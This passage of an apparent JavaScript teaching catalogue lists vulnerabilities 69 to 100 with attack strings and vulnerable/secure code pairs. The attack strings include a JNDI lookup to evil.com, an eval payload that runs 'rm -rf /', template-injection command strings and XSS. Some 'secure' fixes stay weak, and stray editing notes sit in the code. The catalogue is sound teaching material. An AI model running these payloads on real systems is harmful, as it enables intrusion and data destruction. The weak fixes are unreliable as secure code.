      // Use fixed XSLT templates
      // Validate all parameters
    `,
    impact: "Information disclosure, file read"
  },
  {
    id: 69,
    title: "OGNL Injection",
    description: "OGNL expression injection in Java",
    vulnerability: "Unsanitized OGNL expressions",
    attack: "#_memberAccess['allowStaticMethodAccess']=true",
    prevention: "Upgrade Struts, input validation",
    code: `
      // VULNERABLE
      // Struts OGNL injection vulnerable code
      
      // SECURE
      // Use latest Struts version
      // Disable dynamic method invocation
    `,
    impact: "Remote code execution"
  },
  {
    id: 70,
    title: "SSTI - Jinja2",
    description: "Jinja2 template injection",
    vulnerability: "User input in Jinja2 templates",
    attack: "{{ config.items() }}",
    prevention: "Avoid user input in templates",
    code: `
      // VULNERABLE
      template = Template(userInput)
      
      // SECURE
      template = Template('Hello {{ name }}')
      template.render(name=userInput)
    `,
    impact: "Remote code execution"
  },
  {
    id: 71,
    title: "SSTI - Twig",
    description: "Twig template injection in PHP",
    vulnerability: "User input in Twig templates",
    attack: "{{ _self.env.getFilter('system')('id') }}",
    prevention: "Avoid user input in templates",
    code: `
      // VULNERABLE
      $template = $twig->createTemplate($_GET['template']);
      
      // SECURE
      $template = $twig->load('fixed_template.html');
    `,
    impact: "Remote code execution"
  },
  {
    id: 72,
    title: "Padding Oracle - Advanced",
    description: "Advanced padding oracle with custom vectors",
    vulnerability: "Different error responses",
    attack: "Ciphertext manipulation for plaintext recovery",
    prevention: "Use AES-GCM, authenticated encryption",
    code: `
      // VULNERABLE
      if (paddingValid) {
        if (macValid) {
          return "Success";
        } else {
          return "MAC error";
        }
      } else {
        return "Padding error";
      }
      
      // SECURE
      try {
        decryptAndVerify(ciphertext);
        return "Success";
      } catch (e) {
        return "Decryption error";
      }
    `,
    impact: "Complete data decryption"
  },
  {
    id: 73,
    title: "Web Cache Deception",
    description: "Cache sensitive user-specific content",
    vulnerability: "Cacheable authenticated content",
    attack: "/account.php/.css",
    prevention: "Avoid caching private content",
    code: `
      // VULNERABLE
      // Cache proxy caches /account.php/.css
      
      // SECURE
      app.use((req, res, next) => {
        if (req.isAuthenticated()) {
          res.setHeader('Cache-Control', 'no-store');
        }
        next();
      });
    `,
    impact: "Sensitive data exposure"
  },
  {
    id: 74,
    title: "RCE Through ImageMagick",
    description: "ImageMagick command injection",
    vulnerability: "Unsafe ImageMagick delegates",
    attack: "https://example.com/\"|ls \"-la",
    prevention: "Update ImageMagick, sanitize filenames",
    code: `
      // VULNERABLE
      exec('convert ' + userImage + ' output.jpg');
      
      // SECURE
      const { spawn } = require('child_process');
      const args = [userImage, 'output.jpg'];
      spawn('convert', args);
    `,
    impact: "Remote code execution"
  },
  {
    id: 75,
    title: "Ghostcat - AJP Injection",
    description: "Apache JServ Protocol injection",
    vulnerability: "AJP request smuggling",
    attack: "AJP request with malicious attributes",
    prevention: "Update Tomcat, block external AJP",
    code: `
      // VULNERABLE
      // Tomcat AJP connector exposed
      
      // SECURE
      // Update to patched version
      // Restrict AJP access
    `,
    impact: "File read, RCE"
  },
  {
    id: 76,
    title: "Spring Boot Actuator Exploit",
    description: "Spring Boot actuator information disclosure",
    vulnerability: "Exposed actuator endpoints",
    attack: "/actuator/env",
    prevention: "Secure actuator endpoints",
    code: `
      // VULNERABLE
      management.endpoints.web.exposure.include=*
      
      // SECURE
      management.endpoints.web.exposure.include=health,info
      management.endpoint.env.enabled=false
    `,
    impact: "Sensitive information disclosure"
  },
  {
    id: 77,
    title: "EL Injection",
    description: "Expression Language injection in Java",
    vulnerability: "Unsanitized EL expressions",
    attack: "${''.getClass().forName('java.lang.Runtime')}",
    prevention: "Input validation, disable expression evaluation",
    code: `
      // VULNERABLE
      <c:out value="${'param.input'}" />
      
      // SECURE -> Do add template literal like in js for value
      ${`<c:out value="${'fn:escapeXml(param.input)'}" />`}
    `,
    impact: "Remote code execution"
  },
  {
    id: 78,
    title: "Node.js Prototype Pollution - RCE",
    description: "RCE through Node.js prototype pollution",
    vulnerability: "Deep object assignment",
    attack: '{"__proto__":{"execArgv":["--eval=require(\'child_process\').execSync(\'touch /tmp/pwned\')"]}}',
    prevention: "Safe object merging",
    code: `
      // VULNERABLE
      Object.assign({}, JSON.parse(maliciousInput));
      
      // SECURE
      const safeObject = {};
      for (const key in userInput) {
        if (userInput.hasOwnProperty(key) && key !== '__proto__') {
          safeObject[key] = userInput[key];
        }
      }
    `,
    impact: "Remote code execution"
  },
  {
    id: 79,
    title: "Python Code Injection",
    description: "Python eval injection",
    vulnerability: "Unsafe eval usage",
    attack: "__import__('os').system('rm -rf /')",
    prevention: "Avoid eval, use safe alternatives",
    code: `
      // VULNERABLE
      result = eval(user_input)
      
      // SECURE
      # Use ast.literal_eval for safe evaluation
      result = ast.literal_eval(user_input)
    `,
    impact: "Remote code execution"
  },
  {
    id: 80,
    title: "Ruby ERB Injection",
    description: "Ruby ERB template injection",
    vulnerability: "Unsafe ERB template rendering",
    attack: "<%= `id` %>",
    prevention: "Avoid user input in templates",
    code: `
      // VULNERABLE
      ERB.new(user_input).result
      
      // SECURE
      template = ERB.new('Hello <%= name %>')
      template.result(binding)
    `,
    impact: "Remote code execution"
  },
  {
    id: 81,
    title: "Windows Command Injection - PowerShell",
    description: "PowerShell command injection",
    vulnerability: "Unsafe PowerShell execution",
    attack: "; Get-Process;",
    prevention: "Parameterized PowerShell",
    code: `
      // VULNERABLE
      PowerShell "Get-Process " + processName
      
      // SECURE
      PowerShell "Get-Process -Name " + escapedName
    `,
    impact: "Arbitrary command execution"
  },
  {
    id: 82,
    title: "LDAP Injection - Blind",
    description: "Blind LDAP injection",
    vulnerability: "Unsanitized LDAP filters",
    attack: "*)(objectClass=*))(&(objectClass=void",
    prevention: "LDAP filter encoding",
    code: `
      // VULNERABLE
      String filter = "(&(cn=" + username + ")(userPassword=" + password + "))";
      
      // SECURE
      String filter = "(&(cn=" + escapeLDAP(username) + ")(userPassword=" + escapeLDAP(password) + "))";
    `,
    impact: "Authentication bypass, data extraction"
  },
  {
    id: 83,
    title: "NoSQL Injection - MongoDB",
    description: "MongoDB operator injection",
    vulnerability: "Unsanitized MongoDB queries",
    attack: '{"$where": "this.password == \\"test\\""}',
    prevention: "Parameterized queries, input validation",
    code: `
      // VULNERABLE
      db.collection.find({ username: req.body.username });
      
      // SECURE
      db.collection.find({ username: { $eq: req.body.username } });
    `,
    impact: "Authentication bypass, data manipulation"
  },
  {
    id: 84,
    title: "SQL Injection - Second Order",
    description: "Second-order SQL injection",
    vulnerability: "Stored unsanitized data later used in queries",
    attack: "Store malicious input for later execution",
    prevention: "Consistent input validation",
    code: `
      // VULNERABLE
      // Store username without sanitization
      // Later use in query: "SELECT * FROM users WHERE username = '" + username + "'"
      
      // SECURE
      // Sanitize all inputs, use parameterized queries everywhere
    `,
    impact: "Delayed SQL injection execution"
  },
  {
    id: 85,
    title: "XSS - Mutation",
    description: "Mutation XSS through browser parsing differences",
    vulnerability: "Browser HTML parsing quirks",
    attack: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    prevention: "HTML sanitization, CSP",
    code: `
      // VULNERABLE
      element.innerHTML = userContent;
      
      // SECURE
      element.textContent = userContent;
      // OR use DOMPurify
      element.innerHTML = DOMPurify.sanitize(userContent);
    `,
    impact: "Cross-site scripting"
  },
  {
    id: 86,
    title: "HTTP/2 Request Smuggling",
    description: "HTTP/2 request smuggling attacks",
    vulnerability: "HTTP/2 to HTTP/1.1 translation issues",
    attack: "HTTP/2 request with conflicting headers",
    prevention: "Normalize HTTP/2 requests",
    code: `
      // VULNERABLE
      // HTTP/2 front-end with HTTP/1.1 back-end
      
      // SECURE
      // Use consistent HTTP versions
      // Implement request validation
    `,
    impact: "Request smuggling, cache poisoning"
  },
  {
    id: 87,
    title: "JNDI Injection",
    description: "Java Naming and Directory Interface injection",
    vulnerability: "Unsafe JNDI lookups",
    attack: "ldap://evil.com/exploit",
    prevention: "Restrict JNDI lookups",
    code: `
      // VULNERABLE
      new InitialContext().lookup(userInput);
      
      // SECURE
      if (userInput.startsWith("java:/comp/env")) {
        new InitialContext().lookup(userInput);
      }
    `,
    impact: "Remote code execution"
  },
  {
    id: 88,
    title: "Apache Struts RCE",
    description: "Apache Struts remote code execution",
    vulnerability: "OGNL expression injection",
    attack: "%{(#_='multipart/form-data').(...)}",
    prevention: "Update Struts, input validation",
    code: `
      // VULNERABLE
      // Various Struts RCE vulnerabilities
      
      // SECURE
      // Use latest Struts version
      // Implement security filters
    `,
    impact: "Remote code execution"
  },
  {
    id: 89,
    title: "WordPress Plugin RCE",
    description: "WordPress plugin vulnerability exploitation",
    vulnerability: "Unsafe plugin code",
    attack: "Arbitrary file upload, SQL injection",
    prevention: "Keep plugins updated, security reviews",
    code: `
      // VULNERABLE
      // Various WordPress plugin vulnerabilities
      
      // SECURE
      // Regular updates, security scanning
    `,
    impact: "Site compromise, data theft"
  },
  {
    id: 90,
    title: "Drupal RCE",
    description: "Drupal remote code execution",
    vulnerability: "Various Drupal vulnerabilities",
    attack: "Drupalgeddon attacks",
    prevention: "Keep Drupal updated",
    code: `
      // VULNERABLE
      // Various Drupal RCE vulnerabilities
      
      // SECURE
      // Regular security updates
      // Security-focused configuration
    `,
    impact: "Complete site compromise"
  },
  {
    id: 91,
    title: "JBoss RCE",
    description: "JBoss application server RCE",
    vulnerability: "JMX console vulnerabilities",
    attack: "JMX console deployment",
    prevention: "Secure JMX console",
    code: `
      // VULNERABLE
      // Exposed JMX console
      
      // SECURE
      // Restrict access to JMX
      // Use security constraints
    `,
    impact: "Server compromise"
  },
  {
    id: 92,
    title: "WebSphere RCE",
    description: "IBM WebSphere remote code execution",
    vulnerability: "Various WebSphere vulnerabilities",
    attack: "SOAP endpoint exploitation",
    prevention: "Security patches, configuration hardening",
    code: `
      // VULNERABLE
      // Various WebSphere RCE vectors
      
      // SECURE
      // Regular patching
      // Security hardening
    `,
    impact: "Enterprise system compromise"
  },
  {
    id: 93,
    title: "Oracle WebLogic RCE",
    description: "Oracle WebLogic server RCE",
    vulnerability: "Various WebLogic vulnerabilities",
    attack: "T3 protocol exploitation",
    prevention: "Security patches, disable T3",
    code: `
      // VULNERABLE
      // Various WebLogic RCE vulnerabilities
      
      // SECURE
      // Regular patching
      // Disable unused protocols
    `,
    impact: "Enterprise system compromise"
  },
  {
    id: 94,
    title: "Jenkins RCE",
    description: "Jenkins CI/CD server RCE",
    vulnerability: "Groovy script execution",
    attack: "Script console exploitation",
    prevention: "Access control, script sandboxing",
    code: `
      // VULNERABLE
      // Unrestricted script console access
      
      // SECURE
      // Strict access control
      // Script security plugin
    `,
    impact: "Build system compromise"
  },
  {
    id: 95,
    title: "GitHub Actions RCE",
    description: "GitHub Actions workflow RCE",
    vulnerability: "Unsafe workflow configurations",
    attack: "Malicious workflow triggers",
    prevention: "Workflow security hardening",
    code: `
      // VULNERABLE
      on: [push, pull_request]
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
          - uses: actions/checkout@v2
          - run: echo ${"{ github.event.commits[0].message }"}    -> Add more extra brace
      
      // SECURE
      // Review third-party actions
      // Use minimal permissions
    `,
    impact: "Source code compromise"
  },
  {
    id: 96,
    title: "Azure Function RCE",
    description: "Azure Function remote code execution",
    vulnerability: "Insecure function configurations",
    attack: "Command injection in functions",
    prevention: "Input validation, secure coding",
    code: `
      // VULNERABLE
      module.exports = async function (context, req) {
        const result = require('child_process').execSync(req.query.command);
        context.res = { body: result.toString() };
      };
      
      // SECURE
      module.exports = async function (context, req) {
        // Validate and sanitize all inputs
        const safeCommand = validateCommand(req.query.command);
        if (safeCommand) {
          const result = require('child_process').execSync(safeCommand);
          context.res = { body: result.toString() };
        }
      };
    `,
    impact: "Cloud environment compromise"
  },
  {
    id: 97,
    title: "AWS Lambda RCE",
    description: "AWS Lambda function RCE",
    vulnerability: "Insecure Lambda configurations",
    attack: "OS command injection",
    prevention: "Input validation, least privilege",
    code: `
      // VULNERABLE
      exports.handler = async (event) => {
        const exec = require('child_process').exec;
        exec(event.command, (error, stdout) => {
          // Process result
        });
      };
      
      // SECURE
      exports.handler = async (event) => {
        const allowedCommands = ['ls', 'pwd'];
        if (allowedCommands.includes(event.command)) {
          const exec = require('child_process').exec;
          exec(event.command, (error, stdout) => {
            // Process result
          });
        }
      };
    `,
    impact: "AWS environment compromise"
  },
  {
    id: 98,
    title: "Kubernetes RCE",
    description: "Kubernetes container escape",
    vulnerability: "Privileged container configurations",
    attack: "Container escape to host",
    prevention: "Security contexts, pod security policies",
    code: `
      // VULNERABLE
      apiVersion: v1
      kind: Pod
      metadata:
        name: vulnerable-pod
      spec:
        containers:
        - name: test
          image: ubuntu
          securityContext:
            privileged: true
      
      // SECURE
      apiVersion: v1
      kind: Pod
      metadata:
        name: secure-pod
      spec:
        containers:
        - name: test
          image: ubuntu
          securityContext:
            privileged: false
            runAsNonRoot: true
    `,
    impact: "Cluster compromise"
  },
  {
    id: 99,
    title: "Docker Escape",
    description: "Docker container escape to host",
    vulnerability: "Insecure Docker configurations",
    attack: "Privilege escalation through /proc",
    prevention: "Security best practices, updates",
    code: `
      // VULNERABLE
      docker run --privileged -v /:/host ubuntu
      
      // SECURE
      docker run --security-opt=no-new-privileges ubuntu
    `,
    impact: "Host system compromise"
  },
  {
    id: 100,
    title: "Zero-Day Exploit Demo",
    description: "Hypothetical zero-day vulnerability",
    vulnerability: "Unknown vulnerability in software",
    attack: "Custom exploit chain",
    prevention: "Defense in depth, monitoring",
    code: `
      // VULNERABLE
      // Unknown vulnerable code
      
      // MITIGATIONS
      // Network segmentation
      // Application firewalls
      // Intrusion detection
      // Regular updates
    `,
    impact: "System compromise, data breach"
  }
];